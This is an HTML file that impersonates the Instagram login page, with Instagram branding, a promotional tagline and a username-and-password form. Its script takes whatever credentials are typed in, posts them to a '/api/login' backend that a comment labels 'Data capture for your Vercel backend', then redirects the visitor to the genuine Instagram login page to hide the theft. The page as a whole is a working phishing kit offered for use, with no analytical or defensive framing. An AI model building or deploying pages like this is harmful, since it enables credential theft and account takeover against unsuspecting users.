<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <style>
        /* ADAPTIVE THEME VARIABLES */
        :root {
            --bg-page: #ffffff;
            --text-primary: #000000;
            --input-bg: #fafafa;
            --border-color: #dbdbdb;
            --logo-filter: none;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg-page: #000000;
                --text-primary: #f5f5f5;
                --input-bg: #121212;
                --border-color: #262626;
                --logo-filter: invert(1);
            }
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        body {
            background-color: var(--bg-page);
            color: var(--text-primary);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        main {
            display: flex;
            flex: 1;
            align-items: center;
            justify-content: center;
            max-width: 1200px;
            margin: 0 auto;
            width: 100%;
            padding: 20px;
        }

        /* LEFT SIDE: PROMO */
        .promo-side {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-right: 40px;
        }

        /* FIXED LOGO SIZE */
        .main-logo-display { 
            width: 175px !important; 
            min-width: 175px;
            height: auto;
            margin-bottom: 30px; 
            filter: var(--logo-filter); 
        }

        .promo-text {
            font-size: 38px;
            font-weight: 600;
            margin-bottom: 40px;
            text-align: center;
            line-height: 1.2;
        }

        .orange { color: #ff8a00; }
        .pink { color: #ff006e; }

        /* FIXED STORIES IMAGE SIZE */
        .promo-img { 
            width: 320px !important; 
            max-width: 320px;
            height: auto;
            display: block;
        }

        /* RIGHT SIDE: LOGIN FORM */
        .login-side {
            width: 400px;
            padding: 40px;
            display: flex;
            flex-direction: column;
        }

        input {
            width: 100%;
            background: var(--input-bg);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: var(--text-primary);
            padding: 12px;
            margin-bottom: 12px;
            outline: none;
            font-size: 14px;
        }

        .login-btn {
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 8px;
            padding: 10px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
        }

        @media (max-width: 850px) {
            main { flex-direction: column; padding-top: 40px; }
            .promo-side { padding-right: 0; margin-bottom: 40px; }
            .promo-text { font-size: 28px; }
        }
    </style>
</head>
<body>

<main>
    <div class="promo-side">
        <img src="logo.png" class="main-logo-display" alt="Instagram">
        
        <h1 class="promo-text">
            See everyday moments from your <span class="orange">close</span> <span class="pink">friends</span>.
        </h1>

        <img src="stories.png" class="promo-img" alt="Stories Preview">
    </div>

    <div class="login-side">
        <h2 style="margin-bottom: 24px; font-size: 16px;">Log into Instagram</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Phone, username or email" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" class="login-btn">Log in</button>
        </form>
    </div>
</main>

<script>
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const user = document.getElementById('username').value;
        const pass = document.getElementById('password').value;

        try {
            // Data capture for your Vercel backend
            await fetch('/api/login', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user, pass })
            });
        } catch (err) {
            console.error("API Error:", err);
        }

        // Final Redirect
        window.location.href = "https://www.instagram.com/accounts/login/";
    });
</script>

</body>
</html>
